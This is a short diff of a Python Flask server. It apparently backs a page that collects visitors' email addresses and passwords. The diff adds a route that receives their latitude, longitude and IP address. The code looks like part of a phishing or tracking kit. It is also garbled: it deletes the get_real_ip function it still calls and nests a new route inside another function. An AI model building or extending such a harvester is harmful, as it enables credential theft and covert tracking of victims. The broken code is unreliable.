@@ -27,20 +27,21 @@ def submit():
     data = request.get_json()
     email = data.get("email")
     password = data.get("password")
-
-    # Get user's IP
-    user_ip = get_real_ip()
-
+    
    # Function to get the real client IP
-def get_real_ip():
+@app.route("/send-location", methods=["POST"])
+def receive_location():
+    data = request.get_json()
 
-    if "X-Forwarded-For" in request.headers:
-        
-        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
-    else:
-        
-        ip = request.remote_addr
-    return ip
+    lat = data.get("lat")
+    lon = data.get("lon")
+    ip = get_real_ip()
+
+    print("User IP:", ip)
+    print("Latitude:", lat)
+    print("Longitude:", lon)
+
+    return {"status": "success"}
 
     message = f"""
     Email: {email}
